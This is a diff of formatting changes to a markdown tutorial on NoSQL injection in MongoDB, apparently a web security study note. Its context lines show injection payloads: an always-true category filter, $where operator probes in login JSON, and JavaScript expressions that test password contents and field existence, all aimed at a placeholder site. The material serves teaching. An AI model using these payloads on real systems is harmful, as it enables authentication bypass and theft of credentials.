@@ -67,7 +67,7 @@ https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27
 this.category == 'fizzy'||1||''
 ```
 
-* The modified query returns all items (all the products in any category).
+The modified query returns all items (all the products in any category).
 
 {% hint style="warning" %}
 **Warn**: If an application uses it when updating or deleting data, for example, this can result in accidental data loss.
@@ -158,6 +158,8 @@ MongoDB Query and Projection Operators: [https://www.mongodb.com/docs/manual/ref
   * `admin' && this.password.match(/\d/) || 'a'=='b`
     * Identify whether the password contains digits
 
+***
+
 **INJECT OPERATOR (where)**
 
 * Consider `{"username":"wiener","password":"peter"}`
@@ -165,6 +167,8 @@ MongoDB Query and Projection Operators: [https://www.mongodb.com/docs/manual/ref
   * `{"username":"wiener","password":"peter", "$where":"0"}`
   * `{"username":"wiener","password":"peter", "$where":"1"}`
   * Different responses? This may indicate that the JavaScript expression in the `$where` clause is being evaluated
+
+***
 
 **INJECT OPERATOR (regex)**
 
@@ -185,9 +189,9 @@ MongoDB Query and Projection Operators: [https://www.mongodb.com/docs/manual/ref
   * `admin' && this.foo!='` (you know `foo` field doesn't exist)
   * `admin' && this.password!='` (you want identify `password` field)
     * `https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'`
-*   If the `password` field exists, you'd expect the response to be identical to the response for the existing field (`username`), but different to the response for the field that doesn't exist (`foo`).
+* If the `password` field exists, you'd expect the response to be identical to the response for the existing field (`username`), but different to the response for the field that doesn't exist (`foo`).
 
-
+***
 
 **SECOND WAY**
 
